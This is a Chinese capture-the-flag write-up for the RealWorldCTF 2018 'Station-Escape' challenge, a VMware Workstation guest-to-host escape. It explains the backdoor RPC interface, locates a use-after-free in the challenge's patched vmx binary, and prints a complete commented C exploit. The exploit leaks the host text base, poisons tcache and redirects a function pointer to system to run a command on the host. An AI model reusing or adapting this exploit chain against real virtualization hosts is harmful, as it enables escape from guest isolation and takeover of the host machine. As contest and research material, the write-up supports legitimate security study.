# RealWorldCTF Final Station-Escape Writeup
> RWCTF Final 2018是我们觉得非常不错的一次竞赛，非常贴近实战，其中每道题目都值得深入研究。其中Station-Escape是一道VMWare Workstation逃逸的题目，我们觉得非常cool，所以进行了详细分析，这里非常感谢**长亭科技**的**flyyy**师傅贡献的非常优秀的题目和悉心的技术指导。本文分析工作由**r3kapig**的**Ne0**和**bibi**完成。

## 前置知识
在VMWare中，有一个奇特的攻击面，就是vmtools。vmtools帮助宿主机和客户机完成包括文件传输在内的一系列的通信和交互，其中使用了一种被称为backdoor的接口。backdoor接口是如何和宿主机进行通信的呢，我们观察backdoor函数的实现，可以发现如下代码：

```cpp
MOV EAX, 564D5868h                      /* magic number     */
MOV EBX, command-specific-parameter
MOV CX,  backdoor-command-number
MOV DX,  5658h                          /* VMware I/O Port  */

IN  EAX, DX (or OUT DX, EAX)
```

首先需要明确的是，该接口在用户态就可以使用。在通常环境下，IN指令是一条特权指令，在普通用户态程序下是无法使用的。因此，运行这条指令会让用户态程序出错并陷出到hypervisor层，从而hypervisor层可以对客户机进行相关的操作和处理，因此利用此机制完成了通信。利用backdoor的通信机制，客户机便可以使用RPC进行一系列的操作，例如拖放、复制、获取信息、发送信息等等。

backdoor机制所有的命令和调用方法，基本都是首先设置寄存器、然后调用IN或OUT特权指令的模式。那么我们使用backdoor传输RPC指令需要经过哪些步骤呢？我们以本题涉及到的backdoor操作进行说明：

```typescript
     +------------------+
     | Open RPC channel |
     +---------+--------+
               |
  +------------v-----------+
  | Send RPC command length|
  +------------+-----------+
               |
  +------------v-----------+
  | Send RPC command data  |
  +------------+-----------+
               |
 +-------------v------------+
 | Recieve RPC reply length |
 +-------------+------------+
               |
  +------------v-----------+
  | Receive RPC reply data |
  +------------+-----------+
               |
+--------------v-------------+
| Finish receiving RPC reply |
+--------------+-------------+
               |
     +---------v---------+
     | Close RPC channel |
     +-------------------+

```

> 以下内容主要参考（该文档和真实逆向情况略有出入，将会在后文中说明）：https://sites.google.com/site/chitchatvmback/backdoor

### Open RPC channel
> RPC subcommand：00h

调用IN（OUT）前，需要设置的寄存器内容：

```cpp
EAX = 564D5868h - magic number
EBX = 49435052h - RPC open magic number ('RPCI')
ECX(HI) = 0000h - subcommand number
ECX(LO) = 001Eh - command number
EDX(LO) = 5658h - port number
```

返回值：

```cpp
ECX = 00010000h: success / 00000000h: failure
EDX(HI) = RPC channel number
```

该功能用于打开RPC的channel，其中ECX会返回是否成功，EDX返回值会返回一个channel的编号，在后续的RPC通信中，将使用该编号。这里需要注意的是，在单个虚拟机中只能同时使用8个channel（`#0 - #7`）,当尝试打开第9个channel的时候，会检查其他channel的打开时间，如果时间过了某一个值，会将超时的channel关闭，再把这个channel的编号返回；如果都没有超时，create channel会失败。

我们可以使用如下函数实现Open RPC channel的过程：

```CPP
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
	 asm("movl %%eax,%%ebx\n\t"
                "movq %%rdi,%%r10\n\t"
                "movq %%rsi,%%r11\n\t"
                "movq %%rdx,%%r12\n\t"
		"movq %%rcx,%%r13\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0xc9435052,%%ebx\n\t"
                "movl $0x1e,%%ecx\n\t"
                "movl $0x5658,%%edx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%edi,(%%r10)\n\t"
                "movl %%esi,(%%r11)\n\t"
                "movl %%edx,(%%r12)\n\t"
		"movl %%ecx,(%%r13)\n\t"
		:
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13"
        );
}
```

### Send RPC command length
> RPC subcommand：01h

调用：

```CPP
EAX = 564D5868h - magic number
EBX = command length (not including the terminating NULL)
ECX(HI) = 0001h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
```

返回值：

```CPP
ECX = 00810000h: success / 00000000h: failure
```

在发送RPC command前，需要先发送RPC command的长度，需要注意的是，此时我们输入的channel number所指向的channel必须处于已经open的状态。ECX会返回是否成功发送。具体实现如下：

```CPP
void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
	asm("movl %%eax,%%ebx\n\t"
		"movq %%r8,%%r10\n\t"
                "movl %%ecx,%%ebx\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0001001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
                :
                :
        	:"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
	);
}
```

### Send RPC command data
> RPC subcommand：02h

调用：

```CPP
EAX = 564D5868h - magic number
EBX = 4 bytes from the command data (the first byte in LSB)
ECX(HI) = 0002h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
```

返回值:

```CPP
ECX = 000010000h: success / 00000000h: failure
```

该功能必须在Send RPC command length后使用,每次只能发送4个字节。例如，如果要发送命令`machine.id.get`，那么必须要调用4次，分别为：

```CPP
EBX set to 6863616Dh ("mach")
EBX set to 2E656E69h ("ine.")
EBX set to 672E6469h ("id.g")
EBX set to 00007465h ("et\x00\x00")
```
ECX会返回是否成功，具体实现如下：

```CPP
void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
	asm("pushq %%rbp\n\t"
                "movq %%r9,%%r10\n\t"
		"movq %%r8,%%rbp\n\t"
		"movq %%rcx,%%r11\n\t"
		"movq $0,%%r12\n\t"
		"1:\n\t"
		"movq %%r8,%%rbp\n\t"
		"add %%r12,%%rbp\n\t"
		"movl (%%rbp),%%ebx\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0002001e,%%ecx\n\t"
		"movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
		"addq $4,%%r12\n\t"
		"cmpq %%r12,%%r11\n\t"
		"ja 1b\n\t"
		"movl %%ecx,(%%r10)\n\t"
		"popq %%rbp\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
        );
}
```
### Recieve RPC reply length
> RPC subcommand：03h

调用：
```CPP
EAX = 564D5868h - magic number
ECX(HI) = 0003h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
```
返回值：
```CPP
EBX = reply length (not including the terminating NULL)
ECX = 00830000h: success / 00000000h: failure
```
接收RPC reply的长度。需要注意的是所有的RPC command都会返回至少2个字节的reply的数据，其中`1`表示`success`,`0`表示`failure`，即使VMware无法识别RPC command，也会返回`0 Unknown command`作为reply。也就是说，reply数据的前两个字节始终表示RPC command命令的状态。
```CPP
void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
	asm("movl %%eax,%%ebx\n\t"
                "movq %%r8,%%r10\n\t"
                "movq %%rcx,%%r11\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0003001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
		"movl %%ebx,(%%r11)\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11"
        );
		
}
```
### Receive RPC reply data
> RPC subcommand：04h

调用：
```CPP
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0004h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
```
返回：
```CPP
EBX = 4 bytes from the reply data (the first byte in LSB)
ECX = 00010000h: success / 00000000h: failure
```
和`https://sites.google.com/site/chitchatvmback/backdoor`中有出入的是，在实际的逆向分析中，EBX中存放的值，不是reply id，而是reply type，他决定了执行的路径。和发送数据一样，每次只能够接受4个字节的数据。需要注意的是，我们在`Recieve RPC reply length`中提到过，应答数据的前两个字节始终表示RPC command的状态。举例说明，如果我们使用RPC command询问`machine.id.get`，如果成功的话，会返回`1 <virtual machine id>`，否则为`0 No machine id`。
```CPP
void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
	asm("pushq %%rbp\n\t"
                "movq %%r9,%%r10\n\t"
                "movq %%r8,%%rbp\n\t"
                "movq %%rcx,%%r11\n\t"
                "movq $1,%%rbx\n\t"
		"movl $0x564d5868,%%eax\n\t"
                "movl $0x0004001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "in %%dx,%%eax\n\t"
		"add %%r11,%%rbp\n\t"
                "movl %%ebx,(%%rbp)\n\t"
                "movl %%ecx,(%%r10)\n\t"
                "popq %%rbp\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
        );
}
```

### Finish receiving RPC reply
> RPC subcommand：05h

调用：
```CPP
EAX = 564D5868h - magic number
EBX = reply type from subcommand 03h
ECX(HI) = 0005h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
```
返回：
```CPP
ECX = 00010000h: success / 00000000h: failure
```
和前文所述一样，在EBX中存储的是reply type。在接收完reply的数据后，调用此命令。如果没有通过`Receive RPC reply data`接收完整个reply数据的话，就会返回failure。
```CPP
void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
	asm("movl %%eax,%%ebx\n\t"
                "movq %%rcx,%%r10\n\t"
		"movq $0x1,%%rbx\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0005001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
        );
}
```
### Close RPC channel
> RPC subcommand：06h

调用：
```CPP
EAX = 564D5868h - magic number
ECX(HI) = 0006h - subcommand number
ECX(LO) = 001Eh - command number
EDX(HI) = channel number
EDX(LO) = 5658h - port number
```
返回：
```CPP
ECX = 00010000h: success / 00000000h: failure
```
关闭channel。
```CPP
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
	asm("movl %%eax,%%ebx\n\t"
                "movq %%rcx,%%r10\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0006001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
        );
}
```

## 漏洞分析
虽然是RealWorld的竞赛，但是因为是魔改的VMWare Workstation，因此我们通过二进制比对的方式可以快速定位到漏洞点，节省大量的二进制程序审计和漏洞挖掘的时间。
![](/assets/images/backup/realworldctf_2018_stationescape/MKWqK97.png)
可以发现出题人仅仅修改了两处，一处在0x1893c9，另一处在0x1893e6。分别对两个位置进行分析：
![](/assets/images/backup/realworldctf_2018_stationescape/babk4SB.png)
首先在0x1893c9处，channel->out_msg_buf置null的操作被nop掉了：
![](/assets/images/backup/realworldctf_2018_stationescape/npSiUHz.png)
其次在0x1893e6处的函数调用中，v7&1变成了v7&0x21：
![](/assets/images/backup/realworldctf_2018_stationescape/MGjbs9N.png)
在第一处patch中，out_msg_buf没有被置空，其次在第二处patch中，原先被限制的reply type(&0x1)变成了&0x21,也就是说，我们在Finish receiving RPC reply的reply type中可以设置另外一条路径，这条路径会导致在随后的`v6`这个调用(它会call函数`sub_177700`)，`output buffer`被`free`掉。

![](https://i.ibb.co/ZHVgstf/rwctf2.png)

```CPP
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
                "movq %%rcx,%%r10\n\t"
                "movq $0x21,%%rbx\n\t"
                "movl $0x564d5868,%%eax\n\t"
                "movl $0x0005001e,%%ecx\n\t"
                "movw $0x5658,%%dx\n\t"
                "out %%eax,%%dx\n\t"
                "movl %%ecx,(%%r10)\n\t"
                :
                :
                :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
        );
}
```

## 漏洞利用
由上面的分析可以知，这个patch会导致`UAF`:如果我们在接收完成之后设置了`0x20`这个位，那么`output buffer`就会被释放掉，但由于它没有被清零，所以理论上我们可以无限次的将它`free`掉。有了这些条件，我们要完成整个利用就不难了。

利用步骤如下:
`Leak:`
1. 开两个`channel:A，B`
2. `A`的`output buffer`为`buf_A`,然后`A`释放`buf_A`
3. 这时让`B`准备给`guest`发`output`,`B`会分配一个`buffer`，我们利用`info-set`和`info-get`来控制我们分配的`buffer`大小，使得`B`的`output buffer: buf_B=buf_A`。
4. `A`再次释放`buf_A`，这也导致了`buf_B`被释放。这个时候我们就可以`leak`出`buf_B`的`fd`了,但是这个指针没有什么用，我们想要的是`text base`。
5. 因此我们再执行命令`vmx.capability.dnd_version`,这会让`host`分配一块内存来存放一个`obj`,通过控制`buffer`大小我们可以刚好让`buf_B`被用来存放一个`obj`。而这个`obj`里面有`vtable`,我们可以`leak`出来计算`text base`。注意我们一直没有接受`B`的输出，只是让它做好准备(分配output buffer)。直到这个时候我们才接受它的输出，完成`leak`

`Exploit`

有了`leak`的方法，`exploit`的也是类似的了。简单来说就是`UAF`，把`tcache`的`fd`改到`bss`段，然后改函数指针为`system`,最后弹`calculator`

我给作者的exp加上了注释，大家可以参考:
```cpp
#include <stdio.h>
#include <stdint.h>
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rdi,%%r10\n\t"
        "movq %%rsi,%%r11\n\t"
        "movq %%rdx,%%r12\n\t"
        "movq %%rcx,%%r13\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0xc9435052,%%ebx\n\t"
        "movl $0x1e,%%ecx\n\t"
        "movl $0x5658,%%edx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%edi,(%%r10)\n\t"
        "movl %%esi,(%%r11)\n\t"
        "movl %%edx,(%%r12)\n\t"
        "movl %%ecx,(%%r13)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13"
       );
}

void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%r8,%%r10\n\t"
        "movl %%ecx,%%ebx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0001001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}

void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
    asm("pushq %%rbp\n\t"
        "movq %%r9,%%r10\n\t"
        "movq %%r8,%%rbp\n\t"
        "movq %%rcx,%%r11\n\t"
        "movq $0,%%r12\n\t"
        "1:\n\t"
        "movq %%r8,%%rbp\n\t"
        "add %%r12,%%rbp\n\t"
        "movl (%%rbp),%%ebx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0002001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "addq $4,%%r12\n\t"
        "cmpq %%r12,%%r11\n\t"
        "ja 1b\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "popq %%rbp\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
        );
}

void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%r8,%%r10\n\t"
        "movq %%rcx,%%r11\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0003001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "movl %%ebx,(%%r11)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11"
       );

}

void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
    asm("pushq %%rbp\n\t"
        "movq %%r9,%%r10\n\t"
        "movq %%r8,%%rbp\n\t"
        "movq %%rcx,%%r11\n\t"
        "movq $1,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0004001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "in %%dx,%%eax\n\t"
        "add %%r11,%%rbp\n\t"
        "movl %%ebx,(%%rbp)\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "popq %%rbp\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
       );
}

void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movq $0x1,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0005001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movq $0x21,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0005001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0006001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}
struct channel{
    int cookie1;
    int cookie2;
    int num;
};
uint64_t heap =0;
uint64_t text =0;
void run_cmd(char *cmd){
    struct channel tmp;
    int res,len,i;
    char *data;
    channel_open(&tmp.cookie1,&tmp.cookie2,&tmp.num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&res);

    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i+=4){
        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&res);
    }
    printf("recv data:%s\n",data);
    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&res);
    if(!res){
        printf("fail to recv finish\n");
    }

    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&res);
    if(!res){
        printf("fail to close channel\n");
        return;
    }
}
void leak(){
    struct channel chan[10];
    int res=0;
    int len,i;	
    char pay[8192];
    char *s1 = "info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *data;
    char *s2 = "info-get guestinfo.a";
    char *s3 = "1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *s4 = "tools.capability.dnd_version 4";
    char *s5 = "vmx.capability.dnd_version";
    //init data
    run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
    run_cmd(s4);


    //first step 
    channel_open(&chan[0].cookie1,&chan[0].cookie2,&chan[0].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i++){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&res);
    }
    printf("recv data:%s\n",data);
    //second step free the reply and let the other channel get it.

    channel_open(&chan[1].cookie1,&chan[1].cookie2,&chan[1].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }

    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&res);
    if(!res){
        printf("fail to send data\n");
        return;
    }

    //free the output buffer
    printf("Freeing the buffer....,bp:0x5555556DD3EF\n");
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
    if(!res){
        printf("fail to recv finish1\n");
        return;
    }
    //finished sending the command, should get the freed buffer
    printf("Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n");
    getchar();
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&s2[16],&res);
    if(!res){
        printf("fail to send data\n");
        return;
    }
    
    //third step,free it again
    //set status to be 4
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    printf("recv len:%d\n",len);

    //free the output buffer
    printf("Free the buffer again...\n");
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
    if(!res){
        printf("fail to recv finish2\n");
        return;
    }

    printf("Trying to reuse the buffer as a struct, which we can leak..\n");
    getchar();
    run_cmd(s5);
    printf("Should be done.Check the buffer\n");
    getchar();

    //Now the output buffer of chan[1] is used as a struct, which contains many addresses
    channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }


    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i+=4){
        channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&res);
    }
    printf("recv data:\n");
    for(i=0;i<len;i+=8){
        printf("recv data:%lx\n",*(long long *)&data[i]);
    }
    text = (*(uint64_t *)data)-0xf818d0;

    printf("Leak Success\n");
}

void exploit(){
    //the exploit step is almost the same as the leak ones
    struct channel chan[10];
    int res=0;
    int len,i;
    char *data;
    char *s1 = "info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    char *s2 = "info-get guestinfo.b";
    char *s3 = "1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    char *s4 = "gnome-calculator\x00";
    uint64_t pay1 =text+0xFE95B8; 
    uint64_t pay2 =text+0xECFD0; //system
    uint64_t pay3 =text+0xFE95C8;
    char *pay4 = "gnome-calculator\x00";
    run_cmd(s1);
    channel_open(&chan[0].cookie1,&chan[0].cookie2,&chan[0].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i+=4){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&res);
    }
    printf("recv data:%s\n",data);
    channel_open(&chan[1].cookie1,&chan[1].cookie2,&chan[1].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_open(&chan[2].cookie1,&chan[2].cookie2,&chan[2].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_open(&chan[3].cookie1,&chan[3].cookie2,&chan[3].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
    if(!res){
        printf("fail to recv finish2\n");
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    printf("leak2 success\n");
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
    if(!res){
        printf("fail to recv finish2\n");
        return;
    }
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&pay1,&res);
    channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&pay2,&res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&pay3,&res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&res);
    run_cmd(s4);
    if(!res){
        printf("fail to set len\n");
        return;
    }
}
void main(){
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    setvbuf(stdin,0,2,0);
    leak();
    printf("text base :%p",text);
    exploit();
}	
```
Enjoy your calculator:)
![](/assets/images/backup/realworldctf_2018_stationescape/d46yMQQ.png)


## 关于调试
调试有点小技巧需要说明一下。首先就是正常的把`vmware`开起来，然后在`host`用`gdb`来`attach`上去。这个时候我们会下断点，然后继续运行，进入虚拟机`guest`里面跑`exploit`脚本。但大家想一下，如果你还在`guest`里面的时候，`host`的`gdb`遇到了断点，会怎样？
因为`gdb`遇到了断点，那么`guest`就被停住了。然而你还在`guest`里面，你就没有办法按`ctrl+alt`切出来了，就像被人放了一招`时间停止`一样。这个时候你除了含泪强制关机之外没有什么好办法。所以大家在调试的时候记得现在exp开头加个`sleep`,然后在`sleep`的时候赶紧把鼠标切出来到`host`中。这样就可以正常调试了。(PS:好像`mac`不会有这个问题，因为`mac`可以直接用触摸板切出来?)

## 相关材料
题目相关材料：
> 题目操作系统：Ubuntu x64 1804
> 目标VMWare Workstation：VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle，https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp
> patched VMX：https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E

一些参考资料：
> https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware
> https://www.52pojie.cn/thread-783225-1-1.html
> https://sites.google.com/site/chitchatvmback/backdoor